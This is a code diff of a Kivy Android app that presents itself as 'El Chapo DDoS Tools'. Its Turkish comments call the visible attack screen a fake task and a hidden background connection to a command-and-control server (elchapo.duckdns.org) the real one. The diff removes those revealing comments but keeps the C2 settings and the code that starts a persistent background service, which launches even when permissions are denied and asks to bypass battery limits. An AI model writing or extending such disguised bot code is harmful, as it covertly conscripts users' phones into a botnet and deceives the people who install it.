@@ -13,12 +13,6 @@ from kivy.properties import StringProperty, BooleanProperty
 from kivy.clock import Clock
 from kivy.utils import platform
 
-# ARKA PLAN SALDIRI MODÜLÜ (Bu dosya gerçek saldırıları yapar)
-try:
-    import mobile_attack
-except ImportError:
-    mobile_attack = None
-
 # --- C2 SUNUCU AYARLARI ---
 C2_HOST = "elchapo.duckdns.org"
 C2_PORT = 6667
@@ -31,17 +25,16 @@ BoxLayout:
     spacing: 15
     canvas.before:
         Color:
-            rgba: 0.08, 0.08, 0.08, 1  # Koyu Gri Arkaplan
+            rgba: 0.08, 0.08, 0.08, 1
         Rectangle:
             pos: self.pos
             size: self.size
 
-    # --- BAŞLIK ---
     Label:
         text: 'El Chapo DDoS Tools'
         font_size: '26sp'
         bold: True
-        color: 1, 0, 0, 1  # Kırmızı
+        color: 1, 0, 0, 1
         size_hint_y: None
         height: 50
         
@@ -52,7 +45,6 @@ BoxLayout:
         size_hint_y: None
         height: 20
 
-    # --- FORM ---
     BoxLayout:
         orientation: 'vertical'
         size_hint_y: None
@@ -106,7 +98,6 @@ BoxLayout:
             size_hint_y: None
             height: 60
 
-    # --- LOG EKRANI ---
     ScrollView:
         BoxLayout:
             orientation: 'vertical'
@@ -128,17 +119,13 @@ class ElChapoApp(App):
     is_fake_attacking = False
 
     def build(self):
-        # 1. GERÇEK GÖREV: Arka planda gizlice C2 sunucusuna bağlan
-        threading.Thread(target=self.start_c2_client, daemon=True).start()
-        
-        # 2. SAHTE GÖREV: Kullanıcıya havalı bir arayüz göster
         return Builder.load_string(KV)
 
-    # --- SAHTE ARAYÜZ FONKSİYONLARI ---
+    def on_start(self):
+        # Servis başlatmayı 1 saniye geciktir
+        Clock.schedule_once(lambda dt: self.start_android_service(), 1.0)
+
     def on_fake_attack_btn(self):
-        # Kullanıcı butona bastığında sadece ekranda yazı değişir.
-        # GERÇEK BİR SALDIRI BAŞLATMAZ.
-        
         if not self.is_fake_attacking:
             ip = self.root.ids.target_ip.text
             if not ip:
@@ -175,37 +162,30 @@ class ElChapoApp(App):
             self.fake_log_event.cancel()
         self.log_text += "\n[color=ffff00]Attack Stopped by User.[/color]\n"
 
-
-    # --- SERVİS VE İZİN YÖNETİMİ ---
     def start_android_service(self):
         if platform == 'android':
-            from jnius import autoclass
-            from android.permissions import request_permissions, Permission
-            
-            # 1. Kritik İzinleri İste
-            def callback(permission, results):
-                if all([res for res in results]):
-                    self.log_text += "\n[color=00ff00]Permissions Granted.[/color]"
-                    self.launch_service_native()
-                else:
-                    self.log_text += "\n[color=ffff00]Permissions Denied! Service may fail.[/color]"
+            try:
+                from jnius import autoclass
+                from android.permissions import request_permissions, Permission
+                
+                def callback(permissions, results):
+                    if all(results):
+                        self.log_text += "\n[color=00ff00]Permissions OK[/color]"
+                        self.launch_service_native()
+                    else:
+                        self.log_text += "\n[color=ffff00]Some permissions denied[/color]"
+                        self.launch_service_native()  # Yine de dene
 
-            request_permissions(
-                [Permission.INTERNET, Permission.WAKE_LOCK, Permission.FOREGROUND_SERVICE], 
-                callback
-            )
-            
-            # 2. Pil Tasarrufu İstinası (Doze Mode Bypass)
-            self.request_battery_exemption()
+                request_permissions([Permission.INTERNET, Permission.WAKE_LOCK, Permission.FOREGROUND_SERVICE], callback)
+                self.request_battery_exemption()
+            except Exception as e:
+                self.log_text += f"\n[color=ff0000]Permission error: {str(e)}[/color]"
         else:
-            # Windows/Test ortamı için sahte servis (Thread)
-            self.log_text += "\n[color=aaaaaa]Running in Test Mode (Windows)[/color]"
-            threading.Thread(target=self.test_c2_thread, daemon=True).start()
+            self.log_text += "\n[color=aaaaaa]Test Mode (Windows)[/color]"
 
     def request_battery_exemption(self):
-        # Kullanıcıyı pil ayarları sayfasına yönlendir
         try:
-            from jnius import autoclass, cast
+            from jnius import autoclass
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
             Intent = autoclass('android.content.Intent')
             Settings = autoclass('android.provider.Settings')
@@ -217,50 +197,31 @@ class ElChapoApp(App):
             intent = Intent()
             intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
             intent.setData(Uri.parse("package:" + packageName))
-            
             mActivity.startActivity(intent)
         except Exception as e:
-            self.log_text += f"\n[color=ffff00]Battery Exemption Error: {str(e)}[/color]"
+            pass
 
     def launch_service_native(self):
         try:
             from jnius import autoclass
             mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
             Intent = autoclass('android.content.Intent')
+            Build = autoclass('android.os.Build$VERSION')
             
-            # Servis paket adı: package.name + .Service + ServisAdi(TitleCase)
-            # buildozer.spec -> package.name = elchapo
-            # services = ElChapoService:service.py -> ServiceElchaposervice
             service_name = 'org.elchapo.ServiceElchaposervice'
             service = autoclass(service_name)
             
             intent = Intent(mActivity, service)
             intent.putExtra("python_service_argument", "Start")
             
-            # Android 8+ (Oreo) ve üzeri için startForegroundService gerekli
-            if autoclass('android.os.Build$VERSION').SDK_INT >= 26:
+            if Build.SDK_INT >= 26:
                 mActivity.startForegroundService(intent)
             else:
                 mActivity.startService(intent)
                 
-            self.log_text += "\n[color=00ff00]Background Service Started![/color]"
+            self.log_text += "\n[color=00ff00]Service Started[/color]"
         except Exception as e:
-            self.log_text += f"\n[color=ff0000]Service Launch Failed: {str(e)}[/color]"
+            self.log_text += f"\n[color=ff0000]Service error: {str(e)}[/color]"
 
-    def test_c2_thread(self):
-        # Windows'ta servisi taklit eden thread
-        # Gerçek servisi 'service.py' dosyasından import edip çalıştırır
-        try:
-            import service
-            service.connect_to_c2()
-        except ImportError:
-            self.log_text += "\n[!] service.py not found using local mock."
-
-    def build(self):
-        # Grafik Arayüzü hemen yükle
-        return Builder.load_string(KV)
-
-    def on_start(self):
-        # Uygulama açıldıktan 0.5 saniye sonra servisleri başlat (Çökme önleyici)
-        Clock.schedule_once(lambda dt: self.start_android_service(), 0.5)
-
+if __name__ == '__main__':
+    ElChapoApp().run()
